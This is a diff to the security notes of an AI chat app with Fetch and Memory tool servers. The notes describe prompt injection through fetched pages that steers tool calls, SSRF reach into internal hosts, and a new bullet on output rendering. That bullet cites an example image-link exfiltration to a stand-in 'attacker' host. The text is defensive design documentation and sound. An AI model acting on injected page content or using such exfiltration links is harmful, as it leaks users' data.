@@ -24,6 +24,7 @@ The agent endpoints (`/api/chat` etc.) are unauthenticated. Anyone who can reach
 The Fetch MCP server makes **outbound HTTP requests to URLs chosen by the model**. That is the system's deliberate internet access, and it is the main attack surface:
 
 - **Prompt injection:** fetched pages become model input and can steer subsequent tool calls (e.g. writing to Memory).
+- **Rendering model output:** assistant messages are rendered as Markdown (`src/lib/markdown.ts`): `marked` → HTML, sanitized by DOMPurify (no scripts, event handlers, `javascript:` URLs, forms or inline styles). Images are shown as links and never loaded, because an injected `![](https://attacker/?q=…)` would otherwise send data out as soon as it renders. Links open with `rel="noopener noreferrer nofollow"`.
 - **SSRF:** the server does **not** block private or loopback addresses. Under Docker it can reach `mcp-memory:8080` and the host via `host.docker.internal` (including Ollama); under `pnpm dev` it can reach anything on your machine and LAN.
 - It honours `robots.txt` for autonomous fetches; that is a courtesy, not a security control.
 
